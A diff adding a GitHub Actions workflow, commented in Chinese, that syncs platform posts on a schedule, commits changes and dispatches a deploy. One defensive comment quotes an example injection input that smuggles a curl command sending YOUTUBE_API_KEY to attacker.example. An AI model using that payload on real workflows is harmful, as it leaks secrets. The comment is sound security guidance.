@@ -1,0 +1,100 @@
+# 定時去各平臺把新文章抓回來，有變動就 commit。
+#
+# commit 之後會觸發 deploy.yml（因為推到 main），網站就自動更新了。
+#
+# 需要的 secrets（Settings → Secrets and variables → Actions）：
+#   YOUTUBE_API_KEY  選填。沒有的話 YouTube 來源會被略過，其他照跑。
+#   RSSHUB_BASE      選填。沒有的話 Threads 這類需要橋接的來源會被略過。
+# 兩個都沒設也沒關係 —— 有官方 RSS 的平臺照常同步。
+name: 同步各平臺文章
+
+on:
+  schedule:
+    # 臺北時間每天 08:00 與 20:00（cron 用 UTC）
+    - cron: '0 0,12 * * *'
+  workflow_dispatch:
+    inputs:
+      only:
+        description: '只同步指定的來源 id（留空 = 全部）'
+        required: false
+        type: string
+
+permissions:
+  contents: write
+  # 觸發 deploy.yml 需要。原因見下面「觸發部署」那一步的說明。
+  actions: write
+
+concurrency:
+  group: sync-feeds
+  cancel-in-progress: true
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 取出原始碼
+        uses: actions/checkout@v7
+
+      - name: 準備 Node
+        uses: actions/setup-node@v7
+        with:
+          node-version-file: .nvmrc
+          cache: npm
+
+      - name: 安裝相依套件
+        run: npm ci
+
+      - name: 同步
+        env:
+          YOUTUBE_API_KEY: ${{ secrets.YOUTUBE_API_KEY }}
+          RSSHUB_BASE: ${{ secrets.RSSHUB_BASE }}
+          # ⚠️ 使用者輸入一定要先落到環境變數，不能直接寫進 run: 裡面。
+          #
+          # 原本寫的是 --only="${{ inputs.only }}"。那串在 shell 看到之前就被
+          # 字面代換掉了，所以填 `x"; curl attacker.example?k=$YOUTUBE_API_KEY; echo "`
+          # 會變成三個獨立指令 —— 而這個 job 同時握有 secrets 與 contents: write。
+          # 走 env 的話 shell 只會看到一個變數，內容永遠是資料不是程式碼。
+          ONLY_SOURCE: ${{ inputs.only }}
+        # 刻意不加 --strict：某個平臺掛掉不該讓整個流程變紅燈，
+        # 腳本會沿用上一次的快取。要看哪個來源有問題，去網站的 /colophon。
+        run: |
+          if [ -n "$ONLY_SOURCE" ]; then
+            node scripts/sync-feeds.mjs --verbose --only="$ONLY_SOURCE"
+          else
+            node scripts/sync-feeds.mjs --verbose
+          fi
+
+      - name: 有變動就 commit
+        id: commit
+        run: |
+          if git diff --quiet -- src/data/syndication.json; then
+            echo "沒有新東西，不做事。"
+            echo "changed=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+
+          git config user.name  "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add src/data/syndication.json
+
+          COUNT=$(node -p "require('./src/data/syndication.json').itemCount")
+          git commit -m "chore(sync): 更新各平臺文章（共 ${COUNT} 筆）"
+          git push
+          echo "changed=true" >> "$GITHUB_OUTPUT"
+
+      # ⚠️ 這一步不能省。
+      #
+      # 上面那個 git push 是用 GITHUB_TOKEN 做的，而 GitHub 明文規定：
+      # 「Events triggered by the GITHUB_TOKEN will not create a new workflow run」，
+      # 只有 workflow_dispatch 與 repository_dispatch 是例外。
+      #
+      # 也就是說 push 事件**不會**觸發 deploy.yml ——
+      # 同步抓回來的新影片會躺在 repo 裡，網站永遠不更新，而且完全沒有徵兆。
+      # （這是防止 workflow 互相觸發造成無限迴圈的機制。）
+      #
+      # 所以改用 workflow_dispatch 明確叫一次 deploy，那是被允許的例外。
+      - name: 觸發部署
+        if: steps.commit.outputs.changed == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: gh workflow run deploy.yml --ref "${GITHUB_REF_NAME}"
